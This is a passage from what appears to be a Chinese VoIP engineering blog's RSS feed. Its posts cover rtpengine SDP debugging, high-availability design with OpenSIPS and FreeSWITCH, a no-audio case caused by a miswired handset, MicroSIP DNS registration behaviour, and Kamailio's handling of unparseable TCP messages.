&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;IN IP4 203.0.113.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:0 PCMU/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:101 telephone-event/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:101 0-15
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;问题原因&#34;&gt;问题原因&lt;/h1&gt;
&lt;p&gt;刚开始我以为是， &lt;a href=&#34;https://github.com/sipwise/rtpengine/commit/9c00f30&#34;&gt;https://github.com/sipwise/rtpengine/commit/9c00f30&lt;/a&gt; 这次commit引起的问题，我尝试注释代码，然后进行测试，发现可以解决问题。&lt;/p&gt;</description>
    </item>
    <item>
      <title>VoIP Server 高可用架构设计</title>
      <link>https://wdd.js.org/opensips/ch1/ha/</link>
      <pubDate>Tue, 27 May 2025 20:10:22 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/ha/</guid>
      <description>&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;p&gt;VoIP高可用包含很多方面，主要包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;接入层高可用：怎么保证某个接入点出现问题，不会影响到整个平台不可用？&lt;/li&gt;
&lt;li&gt;核心层高可用：怎么保证路由选择的高可用，某个网关不可用，继续尝试其他网关？&lt;/li&gt;
&lt;li&gt;存储层高可用：怎么保证不会丢失录音文件，怎么保证录音文件的完整性？&lt;/li&gt;
&lt;li&gt;数据库层高可用：怎么保证注册信息能够在集群中同步？&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;接入层高可用&#34;&gt;接入层高可用&lt;/h1&gt;
&lt;p&gt;最简单的场景， 只有一个fs, 无论是ua还是gw都接入到fs1上&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ua1 ----&amp;gt; fs1
ua2 ----&amp;gt; fs1
gw1 ----&amp;gt; fs1
gw2 ----&amp;gt; fs1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果要实现高可用，最简单的做法就是再加一个fs2。但是加了fs2之后，ua和gw的接入策略就需要改变了。&lt;/p&gt;
&lt;p&gt;为了保持客户端的接入策略不变，最简单的做法加上一个负载均衡器，然后由负载均衡器来做信令转发。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ua1 ----&amp;gt; op1 ----&amp;gt; fs1
ua2 ----&amp;gt; |   ----&amp;gt; fs2
gw1 ----&amp;gt; |
gw2 ----&amp;gt; |
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;op1是单节点的，也会存在单点故障问题，因此引入op2。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ua1 ----&amp;gt; op1 ----&amp;gt; fs1
ua2 ----&amp;gt; op2 ----&amp;gt; fs2
gw1 ----&amp;gt; |
gw2 ----&amp;gt; |
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;引入op2之后，有两个方案来保证高可用：&lt;/p&gt;
&lt;p&gt;方案1, 主备: op1和op2用VIP来对外提供服务，op1和op2的VIP是一样的。实际只有一个在工作，另外一个处于备份状态。 一旦op1出现问题，op2接管VIP对外提供服务。
- 优点: 简单
- 缺点:
- 兼容性：不是所有云平台都支持VIP
- 成本：需要额外的硬件成本，而且还是闲置状态
- 负载：op1和op2都需要对外提供服务，但是实际上只有一个在工作，一个节点的处理能力有限，总会达到瓶颈&lt;/p&gt;</description>
    </item>
    <item>
      <title>离谱的通话无声问题排查记录</title>
      <link>https://wdd.js.org/posts/2025/no-sound-during-a-call/</link>
      <pubDate>Wed, 07 May 2025 22:45:26 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/no-sound-during-a-call/</guid>
      <description>&lt;h1 id=&#34;简化网络模型&#34;&gt;简化网络模型&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;A 硬件话机&lt;/li&gt;
&lt;li&gt;S SIP 服务器/媒体服务器&lt;/li&gt;
&lt;li&gt;B 客户手机&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A &amp;lt;-SIP/RTP&amp;gt; S &amp;lt;-SIP/RTP&amp;gt; B
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;问题说明&#34;&gt;问题说明&lt;/h1&gt;
&lt;p&gt;通话接通后，双方听不到对方的声音。&lt;/p&gt;
&lt;h1 id=&#34;呼叫流程&#34;&gt;呼叫流程&lt;/h1&gt;
&lt;p&gt;S 发起呼叫，A 接听后，bridge B&lt;/p&gt;
&lt;h1 id=&#34;排查思路&#34;&gt;排查思路&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;检查S在INVITE A时，SDP里携带的c=行，是否是S的公网IP。检查后无问题&lt;/li&gt;
&lt;li&gt;在A上抓包，发现有 S-&amp;gt;A的RTP包，也有 A-&amp;gt;S 的 RTP 包。&lt;/li&gt;
&lt;li&gt;将第二步的抓包文件拿到wireshark中分析。发现S-&amp;gt;A方向的包是正常的，能播放出声音；A-&amp;gt;S方向虽然有RTP包，但是看波形是一条直线，非常奇怪。&lt;/li&gt;
&lt;li&gt;S-&amp;gt;A方向的RTP包，在wireshark中能播放出声音，理论上A应该能听到B的声音的。但是用户反馈听不到。&lt;/li&gt;
&lt;li&gt;咨询用户，用户是如何接听电话的。用户反馈是通过话机手柄接听的电话&lt;/li&gt;
&lt;li&gt;让后让客户使用免提的方式拨打接听电话，发现可以听到声音。&lt;/li&gt;
&lt;li&gt;让客户拍照话机手柄插入话机的接口，发现手柄插入的接头插入了耳麦的接口。&lt;/li&gt;
&lt;li&gt;让客户将手柄插入正确的手柄接口，问题解决。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;延伸思考&#34;&gt;延伸思考&lt;/h1&gt;
&lt;p&gt;这次问题排查，让我想起了之前看过的思科的&lt;a href=&#34;https://www.cisco.com/c/zh_cn/support/docs/voice/voice-quality/211299-Troubleshoot-Voice-Quality-Issues.pdf&#34;&gt;排除语音质量问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章把语音质量问题分为三类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;网络相关(包括网关(GW)和PSTN问题)&lt;/li&gt;
&lt;li&gt;电话型号/固件相关&lt;/li&gt;
&lt;li&gt;设备(例如头戴式耳机)相关&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在步骤上：&lt;/p&gt;
&lt;p&gt;步骤1.隔离语音质量问题的第一步是找出确切的用户体验并与他们交谈（无论是面对面还是通过电话），以获得对语音质量问题的准确描述。如果有大量用户报告问题，请与他们的样本（可能是5-10个）交谈，以获得对症状的准确描述。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;但是实际情况下，我们有时候迫于形势，往往只从一两个客户那里获得只言片语的信息，然后就开始排查了。客户的只言片语如果带有误导性，那么排查的方向就错了。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;步骤2.记录物理位置(例如站点A，2楼)、用户名（用户的电话）、目录号码(DN)、电话型号（例如8865）、电话固件(例如11.5.1)和遇到语音质量问题的电话的IP地址。创建一个按物理位置排序的电子表格。在开始排除故障时创建此电子表格需要30分钟（或更短时间），可节省数小时甚至数天的故障排除时间。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;记录信息很重要，但是实际操作中，往往因为时间紧迫，而没有记录这些信息。或者这些信息记录在头脑中，但是排查到最后才发现，自己忘记了某些信息。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;步骤3.创建电子表格后，查看电话列表，了解电话有哪些共同之处，以及它们与没有语音质量问题的其他电话有何不同。之后，您可以意识到所有有问题的电话都位于同一栋大楼和同一楼层，您可以意识到有问题的电话连接到最近升级的交换机，或者您可以看到所有有问题的电话都位于特定固件上。&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;搞VoIP这么久，碰到过很多疑难杂症。排查思路往往都是从软件或者网络策略层面去排查。 很少考虑到终端的固件和硬件设备上。&lt;/p&gt;
&lt;p&gt;但是这次排查通话无声的问题，让我印象深刻的是，排查到最后才发现是硬件问题。&lt;/p&gt;
&lt;p&gt;从声音的输出输出上，有不同的设备，例如有线耳机、蓝牙耳机、话机手柄、免提等。&lt;/p&gt;
&lt;p&gt;排查这类问题，需要多方面考量。需要挖掘客户的实际使用场景，才能定位到真正的问题。&lt;/p&gt;
&lt;h1 id=&#34;反思&#34;&gt;反思&lt;/h1&gt;
&lt;p&gt;客户的硬件话机，有两个接口。 手柄的接口和耳麦的接口是共用一套接口的。虽然接口上标注的很清楚，但是客户在接线的时候，没有注意到这点。&lt;/p&gt;
&lt;p&gt;这要怎么避免呢？ 骂客户是傻逼吗？&lt;/p&gt;
&lt;p&gt;是不是在设计接口的时候，就应该使用不同形状的接口。 比如手柄接口是圆形，耳麦接口是方形。 这样就能避免这种问题了。&lt;/p&gt;
&lt;p&gt;或者说，接口是通用的。无论是手柄还是耳麦，插上都能用呢。&lt;/p&gt;
&lt;p&gt;还有一种方案，就是只保留一个接口，手柄和耳麦共用一套接口。两者是互斥关系。&lt;/p&gt;</description>
    </item>
    <item>
      <title>DNS域名解析对MicroSIP注册的影响分析</title>
      <link>https://wdd.js.org/posts/2025/dns-and-microsip-register/</link>
      <pubDate>Wed, 30 Apr 2025 17:36:58 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/dns-and-microsip-register/</guid>
      <description>&lt;h1 id=&#34;microsip-dns域名解析影响分析&#34;&gt;microSIP DNS域名解析影响分析&lt;/h1&gt;
&lt;p&gt;MicroSIP是一款流行的windows VoIP客户端，它允许用户通过互联网进行语音和视频通话。在使用MicroSIP时，DNS域名解析是确保正确连接到服务器的重要步骤之一。&lt;/p&gt;
&lt;p&gt;DNS域名解析是将人类可读的域名（如www.example.com）转换为机器可读的IP地址的过程。这个过程通常由用户的网络服务提供商(ISP)或本地计算机上的DNS缓存完成。&lt;/p&gt;
&lt;p&gt;域名解析可以将一个域名解析为多个IP地址，例如：[ip1, ip2, ip3], 但是每次解析返回的顺序往往是不确定的，这取决于DNS服务器的配置和负载均衡策略。&lt;/p&gt;
&lt;p&gt;例如第一次解析的结果可能是[ip1, ip2, ip3]，而第二次解析的结果可能是[ip2, ip3, ip1]。&lt;/p&gt;
&lt;p&gt;MicroSIP客户端在注册时，会尝试连接到这些IP地址中的第一个。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当分机使用TCP方式注册时，如果其第一个IP地址无法连接，它会继续尝试下一个IP地址，直到成功或所有IP地址都失败为止&lt;/li&gt;
&lt;li&gt;如果分机使用UDP方式注册，它只会用第一个IP地址尝试注册，如果失败，还是继续尝试第一个IP。 这种行为似乎有点傻，为什么一直要尝试第一个IP地址，而不是尝试下一个呢？ MicroSIP底层用了pjsip库，而pjsip只有在用tcp/tls注册时， 才会自动尝试下一个IP。pjsip官网也给出了具体的解决方案，就是应用层主动调用 pjsua_acc_modify() 函数，手动修改账号配置，然后重新注册。 但是microSIP并没有这么做，而是直接用一个固定的IP地址去尝试注册。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Our DNS SRV failover support is only limited to TCP (or TLS) connect failure, which in this case pjsip will automatically retries the next server.
&lt;a href=&#34;https://docs.pjsip.org/en/latest/specific-guides/sip/dns_failover.html&#34;&gt;https://docs.pjsip.org/en/latest/specific-guides/sip/dns_failover.html&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;所以，总体上说。在使用域名注册的情况下，当前的注册和上一次的注册可能发往不同的SIP服务器。&lt;/p&gt;
&lt;p&gt;考虑如下场景：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# t1 dns解析结果 ip1, ip2, ip3
REGISTER sip:ip1:5060 SIP/2.0
200 Ok

# t2 dns解析结果 ip3, ip1, ip2
REGISTER sip:ip3:5060 SIP/2.0
200 ok
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一般分机都在内网环境，出口的公网IP是不变的，但是t1和t2的注册由于目标IP不同，所以出口的NAT映射的端口也是不同的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>读到无法解析的TCP包后, kamailio如何处理？</title>
      <link>https://wdd.js.org/kamailio/read-bad-tcp/</link>
      <pubDate>Fri, 18 Apr 2025 23:05:15 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/read-bad-tcp/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;receive_msg&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;receive_info_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rcv_info) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;parse_msg&lt;/span&gt;(buf, len, msg) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;		errsipmsg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;		evp.data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)msg;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex; background-color:#3c3d38&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// note: 这里尝试查找并执行nosip模块的 event_route[nosip:msg]事件路由
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 一般情况下，如果没有找到，那么ret的值是-1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 那么这里的if内部不会执行
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sr_event_exec&lt;/span&gt;(SREV_RCV_NOSIP, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;evp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; NONSIP_MSG_DROP) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;LM_DBG&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;attempt of nonsip message processing failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;		} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NONSIP_MSG_DROP) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 这里也不会执行
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;LM_DBG&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nonsip message processing completed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 由于在上面的判断里errsipmsg被设置成1，所以这里的if条件成立
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(errsipmsg &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 打印报错信息，并执行核心错误处理
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;LOG&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cfg_get&lt;/span&gt;(core, core_cfg, sip_parser_log),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22&lt;/span&gt;&lt;span&gt;				&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;core parsing of SIP message failed (%s:%d/%d)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23&lt;/span&gt;&lt;span&gt;				&lt;span style=&#34;color:#a6e22e&#34;&gt;ip_addr2a&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rcv.src_ip), (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)msg&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rcv.src_port,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24&lt;/span&gt;&lt;span&gt;				(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)msg&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rcv.proto);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;sr_core_ert_run&lt;/span&gt;(msg, SR_CORE_ERT_RECEIVE_PARSE_ERROR);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 跳转到error02标签，执行后续的清理工作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; error02;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29&lt;/span&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 跳转到error02标签，执行后续的清理工作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;error02:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;free_sip_msg&lt;/span&gt;(msg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;34&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;pkg_free&lt;/span&gt;(msg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;35&lt;/span&gt;&lt;span&gt;error00:
